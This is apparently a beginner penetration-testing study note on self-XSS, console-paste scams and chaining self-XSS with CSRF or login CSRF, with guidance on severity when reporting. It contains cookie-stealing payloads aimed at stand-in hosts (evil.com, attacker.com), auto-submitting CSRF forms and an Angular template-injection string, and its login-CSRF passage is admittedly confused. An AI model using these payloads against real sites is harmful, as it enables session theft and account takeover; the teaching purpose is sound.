---
tags: [vapt, xss, beginner]
difficulty: beginner
module: "07 - XSS"
topic: "07.06 Self-XSS and Social Engineering"
---

# 07.06 — Self-XSS and Social Engineering

## What is Self-XSS?

Self-XSS is a "vulnerability" where a user can execute JavaScript in their own browser — but no one else's. On its own, it has near-zero security impact because the attacker can only harm themselves. However, combined with social engineering or CSRF, self-XSS can become exploitable.

```
SELF-XSS SCENARIO:
  1. User finds XSS in their own profile settings
  2. They can inject JS that runs when THEY view their own profile
  3. NO ONE ELSE sees the execution
  → This is Self-XSS — NOT a real vulnerability by itself
  
HOWEVER — CHAINED ATTACKS:
  Self-XSS + CSRF = Real XSS!
  Or: Social engineering + Console injection = Dangerous!
```

---

## The Browser Console Warning

The most common "Self-XSS" social engineering attack:

```
ATTACK (used by real scammers on Facebook, Google, etc.):
  1. Attacker on social media: "Want free coins? Paste this code in your browser console!"
  2. Victim opens DevTools → Console
  3. Victim pastes: document.location='https://evil.com/?c='+document.cookie
  4. Victim's cookies sent to attacker!
  
WHY BROWSERS WARN:
  Chrome/Firefox show "Stop!" warning in console:
  "Warning: This is a browser feature intended for developers.
  If someone told you to copy-paste something here to enable a
  Facebook feature, it is a scam and will give them access to
  your Facebook account."
  
IMPACT: Real victims of "DevTools social engineering" attacks
```

---

## Self-XSS to Real XSS via CSRF

```
SCENARIO:
  1. App has self-XSS in profile field (only visible to owner)
  2. App has CSRF vulnerability in profile update
  
ATTACK:
  1. Attacker hosts evil page:
     <form method="POST" action="https://target.com/profile">
       <input name="bio" value='<script>document.location="https://evil.com/?c="+document.cookie</script>'>
     </form>
     <script>document.forms[0].submit()</script>
     
  2. Victim visits attacker's page
  3. CSRF: form submits to target.com — stores XSS payload in VICTIM's profile
  4. When the VICTIM views their own profile — XSS fires!
  
  Wait — that only affects the victim's own session. But:
  
ESCALATION:
  If profile is PUBLIC, other users see victim's profile
  → Stored XSS now affects OTHER users visiting the victim's profile!
  → Or: victim's profile is shown to admins → admin XSS!
```

---

## Self-XSS to Real XSS via Account Sharing / Login CSRF

```
SCENARIO:
  1. App has self-XSS in logged-in profile settings
  2. Login form has no CSRF protection
  
ATTACK:
  1. Attacker creates their own account
  2. Attacker injects XSS payload in their OWN profile
  3. Attacker crafts CSRF that logs victim INTO attacker's account:
     <form method="POST" action="https://target.com/login">
       <input name="username" value="attacker">
       <input name="password" value="attacker_pass">
     </form>
     <script>document.forms[0].submit()</script>
  4. Victim visits attacker's page → gets logged into attacker's account
  5. Victim navigates to profile → sees attacker's profile → XSS fires!
  6. XSS runs in victim's browser with victim's session
     (wait — victim is in attacker's session here... this is complex)
  
  Actually: if victim types password after being "logged in" as attacker
  → Password captured via keylogger!
  → Or: financial actions performed under victim's session...

THIS IS WHY LOGIN CSRF IS DANGEROUS!
```

---

## Recognizing Self-XSS (Don't Report as High Severity!)

```
SELF-XSS INDICATORS:
  ✓ Only visible to the logged-in user themselves
  ✓ No other users can see the page
  ✓ Requires victim to perform the injection themselves
  ✓ Cannot be triggered without user interaction beyond normal browsing
  
EXAMPLE (Self-XSS, LOW severity):
  User profile: "About me" field
  The injected XSS only shows on YOUR OWN profile view
  → Other users see a different profile page (not yours)
  → This is Self-XSS
  
EXAMPLE (Real XSS, HIGH severity):
  User profile "About me" field  
  The injected XSS shows on YOUR PROFILE to ALL VIEWERS
  → Other users see your profile → they get XSS'd!
  → This is Stored XSS

REPORT SELF-XSS AS:
  Priority: Low (or Informational)
  With note: "Requires chaining with CSRF for exploitation"
  Document the CSRF chain if you find one!
```

---

## Browser Console Injection (Legitimate Pentest Technique)

During a VAPT, you may legitimately use the browser console for testing:

```javascript
// TEST DOM MANIPULATION:
document.body.innerHTML = '<h1>XSS Test</h1>';

// EXFILTRATE COOKIES (in your own browser only — for testing):
console.log(document.cookie);

// CHECK LocalStorage:
console.log(JSON.stringify(localStorage));

// TEST FETCH TO YOUR SERVER:
fetch('https://attacker.com/test?data='+btoa(document.cookie));

// CHECK IF CSP WOULD BLOCK INLINE SCRIPTS:
// (Blocked by CSP error in console if CSP active)

// TEST ANGULAR TEMPLATE INJECTION:
// In Angular's debug mode: {{constructor.constructor('alert(1)')()}}

// THIS IS LEGITIMATE TESTING — but document in your pentest report:
// "I verified XSS exploitability by manually running payload in DevTools
//  to confirm cookie extraction is possible, then generated full PoC payload"
```

---

## Related Notes
- [[02 - Reflected XSS]] — real XSS
- [[03 - Stored XSS]] — stored XSS affecting other users
- [[18 - XSS to CSRF]] — CSRF chaining
- [[Module 09 - CSRF]] — CSRF vulnerability details
